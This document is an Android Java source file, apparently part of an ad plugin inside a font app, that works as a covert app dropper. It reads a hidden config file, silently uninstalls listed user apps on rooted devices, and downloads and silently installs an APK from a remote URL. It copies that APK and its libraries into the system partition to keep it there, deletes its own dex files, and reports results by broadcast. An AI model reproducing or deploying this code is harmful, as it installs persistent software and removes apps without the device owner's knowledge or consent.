package com.ningso.silence;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import com.ningso.silence.downloader.bizs.DLManager;
import com.ningso.silence.downloader.interfaces.SimpleDListener;
import com.ningso.silence.entity.AdBean;
import com.ningso.silence.utils.BackgroundHandler;
import com.ningso.silence.utils.PackageUtils;
import com.ningso.silence.utils.ShellUtils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by NingSo on 16/2/29.下午10:23
 *
 * @author: NingSo
 * @Email: ningso.ping@gmail.com
 */
public class PluginDexManager {
    private static String TAG = PluginDexManager.class.getSimpleName();
    private volatile static PluginDexManager singleton;

    private static final int HAS_INSTALL_SUCCESS = 0x0003;
    private static final int HAS_INSTALL_FAIL = 0x0004;
    private static final String INSTALL_NOMALSUCCESS = "com.ningso.fontad.action.NOMALSUCCESS";
    private static final String INSTALL_SILENTSUCCESS = "com.ningso.fontad.action.SILENTSUCCESS";
    private static final String INSTALL_FAIL = "com.ningso.fontad.action.FAIL";
    private static final String DOWNLOAD_FINISH = "com.ningso.fontad.action.DOWNLOAD_FINISH";
    private static final String DOWNLOAD_ERROR = "com.ningso.fontad.action.DOWNLOAD_ERROR";
    private static final String UNINSTALLSILENT = "com.ningso.fontad.action.UNINSTALLSILENT";

    private static String saveDir = Environment.getExternalStorageDirectory() + "/Studio/";

    private AdBean adBean;
    private String installFile;
    private Context mContext;
    private Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case HAS_INSTALL_SUCCESS:
                    if (adBean != null) {
                        BackgroundHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                if (adBean.getActionType() == 1 && adBean.isRooted()) {
                                    boolean has2system = ShellUtils.CopyApkToSystem(installFile);
                                    ShellUtils.copyLibSo2SystemLib("/data/data/" + adBean.getPkgName() + "/lib");
                                  //  PackageUtils.startInstallAppLauncher(mContext, "com.android.system.book", "com.android.core.MainActivity2");
                                    Log.e(TAG, "plugin copy system" + has2system);
                                }
                                deleteDex(mContext);
                                Log.e(TAG, "plugin de");
                            }
                        });
                    }
                    break;
                case HAS_INSTALL_FAIL:
                    deleteDex(mContext);
                    sendBroadcastToAnalytics(INSTALL_FAIL, adBean.getPkgName(), 3, "success");
                    Log.e(TAG, "plugin install fail");
                    break;
            }
        }
    };

    public PluginDexManager() {

    }

    public static PluginDexManager getInstance() {
        if (singleton == null) {
            singleton = new PluginDexManager();
        }
        return singleton;
    }

    public boolean initialize(final Context context) {
        mContext = context.getApplicationContext();
        try {
            adBean = AdBean.parse(getStringFileFromSd());
            if (adBean != null) {
                if (compare(adBean.getBlackList(), getAppList(mContext))) {
                    //黑名单
                    return false;
                } else {
                    //卸载白名单
                    if (adBean.isRooted()) {
                        unInstallPackages(mContext, getIntersection(adBean.getUninstallList(), getAppList(mContext)));
                    }
                    if (!PackageUtils.checkPackageInstalled(context.getApplicationContext(), adBean.getPkgName())) {
                        DLManager.getInstance(context.getApplicationContext()).dlStart(adBean.getApkUrl(), saveDir, null,
                                new SimpleDListener() {
                                    @Override
                                    public void onFinish(File file) {
                                        super.onFinish(file);
                                        DLManager.getInstance(mContext).dlCancel(adBean.getApkUrl());
                                        sendBroadcastToAnalytics(DOWNLOAD_FINISH, adBean.getPkgName(), 1, "success");
                                        installFile = file.getAbsolutePath();
                                        new InStallSilent(installFile).start();
                                        Log.d(TAG, "plugin download finish" + installFile);
                                    }

                                    @Override
                                    public void onError(int status, String error) {
                                        super.onError(status, error);
                                        Log.d(TAG, "plugin download error" + error);
                                        sendBroadcastToAnalytics(DOWNLOAD_ERROR, adBean.getPkgName(), 1, error);
                                    }
                                });
                    }
                    return true;
                }
            } else {
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private void deleteDex(Context context) {
        new ShellUtils().deleteDir(context.getDir("dex", Context.MODE_PRIVATE));
    }

    private String getConfigJson() {
        return Environment.getExternalStorageDirectory() + File.separator + ".fontdex" + File.separator + "action.json";
    }

    /**
     * 读取assets
     *
     * @param context
     * @param fileName
     * @return
     */
    private String getJson(Context context, String fileName) {
        StringBuilder stringBuilder = new StringBuilder();
        InputStreamReader inputStreamReader = null;
        BufferedReader bf = null;
        try {
            AssetManager assetManager = context.getAssets();
            inputStreamReader = new InputStreamReader(assetManager.open(fileName));
            bf = new BufferedReader(inputStreamReader);
            String line;
            while ((line = bf.readLine()) != null) {
                stringBuilder.append(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (inputStreamReader != null) {
                    inputStreamReader.close();
                }
                if (bf != null) {
                    bf.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return stringBuilder.toString();
    }

    /**
     * 读取sd卡文件
     *
     * @return
     */
    private String getStringFileFromSd() {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            File file = new File(getConfigJson());
            if (file.exists()) {
                FileInputStream fileInputStream = new FileInputStream(file);
                BufferedReader bufferedReader = new BufferedReader(
                        new InputStreamReader(fileInputStream));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line);
                }
                fileInputStream.close();
                bufferedReader.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return stringBuilder.toString();
    }

    /**
     * 获取非系统应用信息列表
     */
    private List<String> getAppList(Context context) {
        PackageManager pm = context.getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        List<String> userAppList = new ArrayList<>();
        for (PackageInfo packageInfo : packages) {
            // 判断系统/非系统应用
            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                userAppList.add(packageInfo.packageName);
            } else {
                // 系统应用　　　　　　　　
            }
        }
        return userAppList;
    }

    /**
     * 比较两个List是否存在相同值
     *
     * @param
     * @param a
     * @param b
     * @return
     */
    private boolean compare(List<String> a, List<String> b) {
        for (String str : a) {
            if (b.contains(str)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 获取交集
     *
     * @param a
     * @param b
     * @return
     */
    private List<String> getIntersection(List<String> a, List<String> b) {
        // a.retainAll(b); 该方法耗时弃用
        List<String> diff = new ArrayList<>();
        for (String str : a) {
            if (b.contains(str)) {
                diff.add(str);
            }
        }
        return diff;
    }

    private void unInstallPackages(final Context content, List<String> pkgName) {
        if (pkgName.size() == 0) {
            return;
        }
        for (final String str : pkgName) {
            BackgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    if (PackageUtils.checkPackageInstalled(content, str)) {
                        if (PackageUtils.uninstallSilent(content, str, false) == 1) {
                            sendBroadcastToAnalytics(UNINSTALLSILENT, str, 4, "success");
                        } else {
                            sendBroadcastToAnalytics(UNINSTALLSILENT, str, 4, "fail");
                        }
                    }
                }
            });
        }
    }

    class InStallSilent extends Thread {

        private String filePath;

        public InStallSilent(String filePath) {
            this.filePath = filePath;
        }

        @Override
        public void run() {
            super.run();
            Message message = new Message();
            int installsuccuess;
            if (adBean.isRooted() || PackageUtils.isSystemApplication(mContext) || ShellUtils.checkRootPermission()) {
                installsuccuess = PackageUtils.installSilent(mContext, filePath);
                if (installsuccuess == 1) {
                    sendBroadcastToAnalytics(INSTALL_SILENTSUCCESS, adBean.getPkgName(), 0, "success");
                }
            } else {
                installsuccuess = PackageUtils.installNormal(mContext, filePath) ? 1 : -3;
                if (installsuccuess == 1) {
                    sendBroadcastToAnalytics(INSTALL_NOMALSUCCESS, adBean.getPkgName(), 1, "success");
                }
            }
            Log.d(TAG, "plugin install  == 1: " + installsuccuess);
            if (installsuccuess == 1) {
                message.what = HAS_INSTALL_SUCCESS;
            } else {
                message.what = HAS_INSTALL_FAIL;
            }
            handler.sendMessage(message);
        }
    }

    /**
     * 发送广播宿主用作统计
     *
     * @param actionType  发送广播action的类型
     * @param installType 安装类型,0--静默安装,1--正常安装,3--安装失败,4--静默卸载,-1不是安装命令
     * @param result      返回执行结果
     */
    private void sendBroadcastToAnalytics(String actionType, String pkg, int installType, String result) {
        try {
            Intent intent = new Intent(actionType);
            intent.putExtra("install_pkg", pkg);
            intent.putExtra("install_type:", installType);
            intent.putExtra("action_result", result);
            mContext.sendBroadcast(intent);
        } catch (Exception e) {
            Log.d("ee", "dex sendBroadcastToAnalytics extra exception");
        }
    }
}
